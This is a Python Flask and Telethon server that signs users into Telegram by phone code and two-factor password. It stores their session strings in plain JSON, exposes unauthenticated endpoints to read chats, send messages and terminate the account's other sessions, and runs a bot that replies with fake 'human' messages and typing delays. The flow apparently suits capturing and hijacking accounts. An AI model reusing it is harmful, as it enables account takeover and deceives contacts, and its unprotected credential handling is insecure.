from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
from telethon.events import NewMessage
import json
import os
import asyncio
import logging
import time
import random
import threading
from datetime import datetime, timedelta
import re

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
active_clients = {}
client_tasks = {}

# Helper to run async functions
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# Load accounts from file
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    accounts = json.loads(content)
                else:
                    accounts = []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

# Load reply settings
def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    reply_settings = json.loads(content)
                else:
                    reply_settings = {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

# Load conversation history
def load_conversation_history():
    global conversation_history
    try:
        if os.path.exists(CONVERSATION_HISTORY_FILE):
            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    conversation_history = json.loads(content)
                else:
                    conversation_history = {}
        else:
            conversation_history = {}
            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded conversation history")
    except Exception as e:
        logger.error(f"Error loading conversation history: {e}")
        conversation_history = {}

# Save accounts to file
def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

# Save reply settings
def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")
        return False

# Save conversation history
def save_conversation_history():
    try:
        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
            json.dump(conversation_history, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving conversation history: {e}")
        return False

# Remove invalid account
def remove_invalid_account(account_id):
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        logger.info(f"🗑️ Removed invalid account {account_id}")
        return True
    return False

# Load all data on startup
load_accounts()
load_reply_settings()
load_conversation_history()

# -------------------- AUTO-REPLY SYSTEM --------------------

# Human-like response templates with context awareness
RESPONSE_TEMPLATES = {
    "greeting": [
        "Hey! How are you?",
        "Hi there! What's up?",
        "Hello! How's your day going?",
        "Hey! Good to hear from you",
        "Hi! How can I help you today?"
    ],
    "how_are_you": [
        "I'm doing well, thanks for asking! How about you?",
        "Pretty good! Just busy with some work. You?",
        "All good here! How are things with you?",
        "Can't complain! What's new with you?",
        "Doing great! Thanks for checking in."
    ],
    "busy": [
        "Yeah, been really busy lately. Work is crazy.",
        "So much to do, so little time!",
        "Always busy, but that's life right?",
        "Yeah, juggling a few things at once.",
        "Too busy! Need a vacation soon."
    ],
    "plans": [
        "Not sure yet, still figuring it out. You?",
        "Probably just chill at home. What about you?",
        "Haven't made any plans yet. Any suggestions?",
        "Might hang out with some friends. You free?",
        "Still deciding. What are you up to?"
    ],
    "work": [
        "Work's going okay. Could be better though.",
        "Same old same old. How's work for you?",
        "Busy as always. Can't complain though.",
        "It's fine. Looking forward to the weekend!",
        "Getting through it. How's your work going?"
    ],
    "thanks": [
        "No problem! Happy to help.",
        "You're welcome! Anytime.",
        "Of course! Glad I could help.",
        "No worries at all!",
        "Anytime, that's what friends are for."
    ],
    "goodbye": [
        "Gotta go now, talk later!",
        "Catch you later! Take care.",
        "Bye! Have a good one!",
        "Talk soon!",
        "Take care, talk to you later!"
    ],
    "question": [
        "That's a good question. What do you think?",
        "Hmm, I'm not entirely sure. What's your take?",
        "Interesting question! Why do you ask?",
        "Good question. I'd have to think about that.",
        "That's something I've wondered about too."
    ],
    "agreement": [
        "Exactly! That's what I was thinking.",
        "Totally agree with you.",
        "Right? That's so true.",
        "Couldn't have said it better myself.",
        "Yeah, I feel the same way."
    ],
    "surprise": [
        "Wow, really? That's surprising!",
        "No way! That's crazy.",
        "Oh wow, I didn't expect that.",
        "Seriously? That's wild.",
        "Oh really? Tell me more!"
    ],
    "personal": [
        "I've been pretty busy with work lately, you know how it is.",
        "Just taking it easy, enjoying the little things.",
        "Been trying to stay positive. Life's good!",
        "Just going with the flow. How about you?",
        "Same old, trying to make the most of each day."
    ],
    "weather": [
        "Weather's been nice lately, perfect for a walk.",
        "Yeah it's pretty hot/cold outside. How's the weather there?",
        "Perfect weather for staying in and relaxing.",
        "I love this weather! So nice.",
        "Weather's been crazy lately, right?"
    ],
    "food": [
        "Just had some lunch/dinner, it was good!",
        "Been craving some good food lately. Any recommendations?",
        "I love trying new restaurants. Found any good ones lately?",
        "Food's always good! What did you have?",
        "I'm always down for good food!"
    ],
    "movie": [
        "I saw a great movie recently, you should check it out.",
        "Been meaning to watch something good. Any suggestions?",
        "Movies are my go-to for relaxing. Seen anything good?",
        "What kind of movies do you like?",
        "I'm more of a series person actually."
    ],
    "sports": [
        "Been following the games lately, exciting stuff!",
        "Not a huge sports fan, but I can appreciate a good game.",
        "Did you see the game last night?",
        "Sports are fun to watch with friends.",
        "I prefer playing rather than watching actually."
    ],
    "weekend": [
        "Looking forward to the weekend! Need a break.",
        "Any fun plans for the weekend?",
        "Weekend can't come soon enough!",
        "Hope you have a great weekend!",
        "Weekends are the best, right?"
    ],
    "morning": [
        "Good morning! Hope you slept well.",
        "Morning! Ready to start the day?",
        "Rise and shine! How are you this morning?",
        "Good morning! Got any plans today?",
        "Morning! Coffee time!"
    ],
    "evening": [
        "Good evening! How was your day?",
        "Evening! Finally time to relax.",
        "Hope you had a good day!",
        "Evening vibes are the best.",
        "Time to unwind after a long day."
    ],
    "night": [
        "Getting late, should probably sleep soon.",
        "Night! Sleep well!",
        "Don't stay up too late!",
        "Goodnight! Talk tomorrow.",
        "Sweet dreams!"
    ],
    "default": [
        "Yeah, I get what you mean.",
        "That's interesting! Tell me more.",
        "Oh really? That's cool.",
        "I know right?",
        "Totally!",
        "For sure.",
        "Definitely.",
        "Absolutely.",
        "No doubt.",
        "Could be."
    ]
}

def detect_intent(message):
    """Detect the intent of a message using simple pattern matching"""
    message = message.lower().strip()
    
    # Greetings
    if any(word in message for word in ['hi', 'hello', 'hey', 'greetings', 'sup', 'yo']):
        return "greeting"
    
    # How are you
    if any(phrase in message for phrase in ['how are you', 'how r u', 'how you doing', 'how do you do', 'how are things']):
        return "how_are_you"
    
    # Thanks
    if any(word in message for word in ['thanks', 'thank you', 'thx', 'appreciate it', 'ty']):
        return "thanks"
    
    # Goodbye
    if any(word in message for word in ['bye', 'goodbye', 'see you', 'talk later', 'cya', 'later']):
        return "goodbye"
    
    # Questions (messages ending with ?)
    if '?' in message:
        return "question"
    
    # Agreement
    if any(phrase in message for phrase in ['i agree', 'you right', 'true', 'exactly', 'same here', 'me too']):
        return "agreement"
    
    # Surprise
    if any(word in message for word in ['wow', 'no way', 'really', 'seriously', 'omg', 'oh']):
        return "surprise"
    
    # Personal updates
    if any(word in message for word in ['i am', 'im', 'i feel', 'i think', 'my day', 'i been']):
        return "personal"
    
    # Busy
    if any(word in message for word in ['busy', 'working', 'work', 'job', 'office']):
        return "work"
    
    # Plans
    if any(word in message for word in ['plan', 'doing', 'going', 'tonight', 'tomorrow']):
        return "plans"
    
    # Weather
    if any(word in message for word in ['weather', 'rain', 'sunny', 'cloudy', 'hot', 'cold']):
        return "weather"
    
    # Food
    if any(word in message for word in ['food', 'eat', 'hungry', 'lunch', 'dinner', 'breakfast']):
        return "food"
    
    # Movies/TV
    if any(word in message for word in ['movie', 'film', 'watch', 'show', 'series', 'episode']):
        return "movie"
    
    # Sports
    if any(word in message for word in ['sport', 'game', 'match', 'team', 'play', 'ball']):
        return "sports"
    
    # Weekend
    if any(word in message for word in ['weekend', 'friday', 'saturday', 'sunday']):
        return "weekend"
    
    # Time of day
    if any(word in message for word in ['morning', 'afternoon', 'evening', 'night']):
        if 'good' in message:
            return message.split()[0]  # good morning, good evening
    
    return "default"

def get_time_based_response():
    """Get response based on time of day"""
    hour = datetime.now().hour
    if 5 <= hour < 12:
        return random.choice(RESPONSE_TEMPLATES["morning"])
    elif 12 <= hour < 18:
        return random.choice(RESPONSE_TEMPLATES["personal"])
    elif 18 <= hour < 22:
        return random.choice(RESPONSE_TEMPLATES["evening"])
    else:
        return random.choice(RESPONSE_TEMPLATES["night"])

def generate_human_response(message, intent, conversation_context=None):
    """Generate a human-like response based on intent and context"""
    
    # If no specific intent, use default responses
    if intent not in RESPONSE_TEMPLATES:
        intent = "default"
    
    # Get base response
    response = random.choice(RESPONSE_TEMPLATES[intent])
    
    # Add variety with occasional questions
    if random.random() < 0.3:  # 30% chance to add a follow-up question
        follow_ups = [
            " What do you think?",
            " How about you?",
            " Right?",
            " You know?",
            " What's your take?",
            " Agree?",
            " Don't you think?"
        ]
        response += random.choice(follow_ups)
    
    # Add emojis occasionally for more human-like feel
    if random.random() < 0.2:  # 20% chance
        emojis = ["😊", "👍", "😄", "🙂", "😉", "🤔", "😅", "👌"]
        response += " " + random.choice(emojis)
    
    return response

def simulate_typing_delay():
    """Simulate human typing delay"""
    return random.uniform(1.5, 4.0)  # 1.5 to 4 seconds delay

async def auto_reply_handler(event, account_id):
    """Handle incoming messages and auto-reply"""
    try:
        # Don't reply to our own messages
        if event.out:
            return
        
        # Get sender info
        sender = await event.get_sender()
        if not sender:
            return
        
        chat_id = str(event.chat_id)
        message_text = event.message.text or ""
        
        # Check if auto-reply is enabled for this account
        account_key = str(account_id)
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return
        
        # Get specific chat settings
        chat_settings = reply_settings[account_key].get('chats', {})
        chat_enabled = chat_settings.get(chat_id, {}).get('enabled', True)  # Default to enabled
        
        if not chat_enabled:
            return
        
        # Initialize conversation history for this chat
        if account_key not in conversation_history:
            conversation_history[account_key] = {}
        
        if chat_id not in conversation_history[account_key]:
            conversation_history[account_key][chat_id] = []
        
        # Add message to history
        conversation_history[account_key][chat_id].append({
            'role': 'user',
            'text': message_text,
            'time': time.time()
        })
        
        # Keep only last 10 messages for context
        if len(conversation_history[account_key][chat_id]) > 10:
            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-10:]
        
        # Detect intent
        intent = detect_intent(message_text)
        logger.info(f"Detected intent: {intent} for message: {message_text[:50]}")
        
        # Generate response
        response = generate_human_response(message_text, intent, conversation_history[account_key][chat_id])
        
        # Simulate typing
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(simulate_typing_delay())
        
        # Send reply
        await event.reply(response)
        logger.info(f"Auto-replied to {chat_id}: {response[:50]}")
        
        # Add reply to history
        conversation_history[account_key][chat_id].append({
            'role': 'assistant',
            'text': response,
            'time': time.time()
        })
        
        # Save conversation history periodically
        save_conversation_history()
        
    except Exception as e:
        logger.error(f"Error in auto-reply handler: {e}")

async def start_auto_reply_for_account(account):
    """Start auto-reply listener for a specific account"""
    account_id = account['id']
    
    try:
        # Create client
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        # Check authorization
        if not await client.is_user_authorized():
            logger.error(f"Account {account_id} not authorized")
            return
        
        # Store client
        active_clients[account_id] = client
        
        # Define handler
        @client.on(NewMessage(incoming=True))
        async def handler(event):
            await auto_reply_handler(event, account_id)
        
        # Start client
        await client.start()
        logger.info(f"Started auto-reply listener for account {account_id}")
        
        # Keep running
        await client.run_until_disconnected()
        
    except Exception as e:
        logger.error(f"Error in auto-reply for account {account_id}: {e}")
        if account_id in active_clients:
            del active_clients[account_id]

def start_all_auto_replies():
    """Start auto-reply for all accounts with enabled settings"""
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda: run_async(start_auto_reply_for_account(account)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                logger.info(f"Started auto-reply thread for account {account_key}")

def stop_auto_reply_for_account(account_id):
    """Stop auto-reply for a specific account"""
    account_key = str(account_id)
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
            logger.info(f"Stopped auto-reply for account {account_key}")
        except Exception as e:
            logger.error(f"Error stopping auto-reply: {e}")

# -------------------- PAGE ROUTES --------------------
@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/settings')
def settings():
    return send_file('settings.html')

# -------------------- AUTO-REPLY API ROUTES --------------------

# Get auto-reply settings for an account
@app.route('/api/reply-settings', methods=['GET'])
def get_reply_settings():
    account_id = request.args.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    settings = reply_settings.get(account_key, {
        'enabled': False,
        'chats': {}
    })
    
    return jsonify({
        'success': True,
        'settings': settings
    })

# Update auto-reply settings
@app.route('/api/reply-settings', methods=['POST'])
def update_reply_settings():
    data = request.json
    account_id = data.get('accountId')
    enabled = data.get('enabled', False)
    chat_settings = data.get('chats', {})
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    
    # Update settings
    if account_key not in reply_settings:
        reply_settings[account_key] = {}
    
    reply_settings[account_key]['enabled'] = enabled
    reply_settings[account_key]['chats'] = chat_settings
    
    save_reply_settings()
    
    # Start or stop auto-reply based on setting
    if enabled:
        # Find account
        account = None
        for acc in accounts:
            if acc['id'] == account_id:
                account = acc
                break
        
        if account:
            # Start auto-reply in background
            thread = threading.Thread(
                target=lambda: run_async(start_auto_reply_for_account(account)),
                daemon=True
            )
            thread.start()
            client_tasks[account_key] = thread
    else:
        # Stop auto-reply
        stop_auto_reply_for_account(account_id)
    
    return jsonify({
        'success': True,
        'message': 'Auto-reply settings updated'
    })

# Toggle auto-reply for specific chat
@app.route('/api/toggle-chat-reply', methods=['POST'])
def toggle_chat_reply():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    enabled = data.get('enabled', True)
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {
            'enabled': False,
            'chats': {}
        }
    
    if 'chats' not in reply_settings[account_key]:
        reply_settings[account_key]['chats'] = {}
    
    reply_settings[account_key]['chats'][str(chat_id)] = {
        'enabled': enabled
    }
    
    save_reply_settings()
    
    return jsonify({
        'success': True,
        'message': f'Auto-reply for chat {"enabled" if enabled else "disabled"}'
    })

# Get conversation history
@app.route('/api/conversation-history', methods=['GET'])
def get_conversation_history():
    account_id = request.args.get('accountId')
    chat_id = request.args.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    chat_key = str(chat_id)
    
    history = []
    if account_key in conversation_history and chat_key in conversation_history[account_key]:
        history = conversation_history[account_key][chat_key]
    
    return jsonify({
        'success': True,
        'history': history
    })

# Clear conversation history
@app.route('/api/clear-history', methods=['POST'])
def clear_conversation_history():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    chat_key = str(chat_id)
    
    if account_key in conversation_history and chat_key in conversation_history[account_key]:
        conversation_history[account_key][chat_key] = []
        save_conversation_history()
    
    return jsonify({
        'success': True,
        'message': 'Conversation history cleared'
    })

# -------------------- EXISTING API ROUTES --------------------

# Get all accounts
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    formatted = []
    for acc in accounts:
        account_key = str(acc['id'])
        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
        formatted.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown'),
            'auto_reply_enabled': has_reply
        })
    return jsonify({'success': True, 'accounts': formatted})

# Send OTP
@app.route('/api/add-account', methods=['POST'])
def add_account():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    if not phone.startswith('+'):
        phone = '+' + phone
    
    async def send_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            session_id = str(int(time.time()))
            temp_sessions[session_id] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save()
            }
            return {'success': True, 'session_id': session_id}
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send_code())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Verify code
@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(
                    session_data['phone'], 
                    code, 
                    phone_code_hash=session_data['hash']
                )
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            new_id = 1
            if accounts:
                new_id = max([a['id'] for a in accounts]) + 1
            
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'session': client.session.save()
            }
            
            accounts.append(new_account)
            save_accounts()
            
            return {'success': True}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Get chats
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    # Find account
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Check if authorized first
            if not await client.is_user_authorized():
                return {
                    'success': False, 
                    'error': 'auth_key_unregistered',
                    'message': 'Session expired. Please re-add this account.',
                    'account_id': account_id
                }
            
            # Get all dialogs
            dialogs = await client.get_dialogs()
            logger.info(f"Found {len(dialogs)} dialogs for account {account_id}")
            
            chats = []
            
            for dialog in dialogs:
                if not dialog:
                    continue
                
                # Basic info only
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                
                # Simple chat object
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or 'Unknown',
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': '',
                    'lastMessageDate': 0,
                    'auto_reply_enabled': False  # Will be updated by frontend
                }
                
                # Add last message if exists
                if dialog.message:
                    if dialog.message.text:
                        chat['lastMessage'] = dialog.message.text[:50]
                    elif dialog.message.media:
                        chat['lastMessage'] = '📎 Media'
                    
                    if dialog.message.date:
                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
                
                chats.append(chat)
            
            return {
                'success': True,
                'chats': chats,
                'messages': []
            }
            
        except AuthKeyUnregisteredError:
            logger.error(f"Auth key unregistered for account {account_id}")
            remove_invalid_account(account_id)
            return {
                'success': False, 
                'error': 'auth_key_unregistered',
                'message': 'Session expired. Account has been removed. Please add it again.',
                'account_id': account_id
            }
        except errors.FloodWaitError as e:
            logger.error(f"Flood wait for account {account_id}: {e.seconds}s")
            return {
                'success': False,
                'error': 'flood_wait',
                'message': f'Too many requests. Please wait {e.seconds} seconds.',
                'wait': e.seconds
            }
        except Exception as e:
            logger.error(f"Error fetching chats for account {account_id}: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in get-messages: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Send message
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing required fields'})
    
    # Find account
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {
                    'success': False, 
                    'error': 'auth_key_unregistered',
                    'message': 'Session expired. Please re-add this account.'
                }
            
            # Get entity
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                try:
                    entity = await client.get_entity(chat_id)
                except:
                    return {'success': False, 'error': 'Chat not found'}
            
            await client.send_message(entity, message)
            return {'success': True}
            
        except AuthKeyUnregisteredError:
            logger.error(f"Auth key unregistered for account {account_id} during send")
            remove_invalid_account(account_id)
            return {
                'success': False, 
                'error': 'auth_key_unregistered',
                'message': 'Session expired. Account has been removed.'
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Remove account
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    
    # Stop auto-reply if running
    stop_auto_reply_for_account(account_id)
    
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    
    if len(accounts) < original_len:
        save_accounts()
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Account not found'})

# Get all active sessions for an account
@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    # Find account
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def get_sessions():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Get all authorized sessions
            result = await client(functions.account.GetAuthorizationsRequest())
            
            sessions = []
            current_hash = None
            
            for auth in result.authorizations:
                session_info = {
                    'hash': auth.hash,
                    'device_model': auth.device_model,
                    'platform': auth.platform,
                    'system_version': auth.system_version,
                    'api_id': auth.api_id,
                    'app_name': auth.app_name,
                    'app_version': auth.app_version,
                    'date_created': auth.date_created,
                    'date_active': auth.date_active,
                    'ip': auth.ip,
                    'country': auth.country,
                    'region': auth.region,
                    'current': auth.current
                }
                
                if auth.current:
                    current_hash = auth.hash
                
                sessions.append(session_info)
            
            return {
                'success': True,
                'sessions': sessions,
                'current_hash': current_hash,
                'count': len(sessions)
            }
            
        except FreshResetAuthorisationForbiddenError:
            return {
                'success': False,
                'error': 'fresh_reset_forbidden',
                'message': 'Cannot view sessions within 24 hours of login'
            }
        except Exception as e:
            logger.error(f"Error getting sessions: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(get_sessions())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Terminate specific session by hash
@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    data = request.json
    account_id = data.get('accountId')
    session_hash = data.get('hash')
    
    if not account_id or not session_hash:
        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
    
    # Find account
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Terminate the specific session
            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
            
            logger.info(f"Terminated session {session_hash} for account {account_id}")
            return {'success': True}
            
        except FreshResetAuthorisationForbiddenError:
            return {
                'success': False,
                'error': 'Cannot terminate sessions within 24 hours of login'
            }
        except Exception as e:
            logger.error(f"Error terminating session: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Terminate all other sessions
@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    # Find account
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Get all authorized sessions
            result = await client(functions.account.GetAuthorizationsRequest())
            
            # Find current session hash
            current_hash = None
            for auth in result.authorizations:
                if auth.current:
                    current_hash = auth.hash
                    break
            
            # Terminate all sessions except current
            count = 0
            for auth in result.authorizations:
                if auth.hash != current_hash:  # Not current session
                    try:
                        # Use the correct method with session hash
                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
                        count += 1
                        logger.info(f"Terminated session: {auth.device_model} - {auth.platform}")
                    except errors.FloodWaitError as e:
                        logger.warning(f"Flood wait: {e.seconds}s")
                        continue
                    except Exception as e:
                        logger.error(f"Error terminating session: {e}")
                        continue
            
            return {
                'success': True, 
                'message': f'Terminated {count} other sessions',
                'count': count
            }
        except FreshResetAuthorisationForbiddenError:
            return {
                'success': False, 
                'error': 'Cannot terminate sessions within 24 hours of login'
            }
        except Exception as e:
            logger.error(f"Error terminating sessions: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Health check
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'temp_sessions': len(temp_sessions),
        'auto_reply_accounts': len(active_clients)
    })

# Start auto-reply on server start
def start_auto_reply_thread():
    """Start auto-reply in a separate thread"""
    time.sleep(5)  # Wait for server to fully start
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            thread = threading.Thread(
                target=lambda: run_async(start_auto_reply_for_account(account)),
                daemon=True
            )
            thread.start()
            client_tasks[account_key] = thread
            logger.info(f"Started auto-reply thread for account {account_key}")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*60)
    print('📱 TELEGRAM MANAGER - WITH AUTO-REPLY')
    print('='*60)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts loaded: {len(accounts)}')
    print(f'✅ Auto-reply enabled: {len([a for a in reply_settings if reply_settings[a].get("enabled")])}')
    print(f'✅ Endpoints:')
    print(f'   - Page Routes: /, /login, /dashboard, /dash, /all, /settings')
    print(f'   - Account API: /api/accounts, /api/add-account, /api/verify-code')
    print(f'   - Chat API: /api/get-messages, /api/send-message')
    print(f'   - Auto-Reply API: /api/reply-settings, /api/toggle-chat-reply, /api/conversation-history')
    print(f'   - Session API: /api/get-sessions, /api/terminate-session, /api/terminate-sessions')
    print(f'   - Health: /api/health')
    print('='*60 + '\n')
    
    # Start auto-reply in background
    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
    
    app.run(host='0.0.0.0', port=port, debug=False)
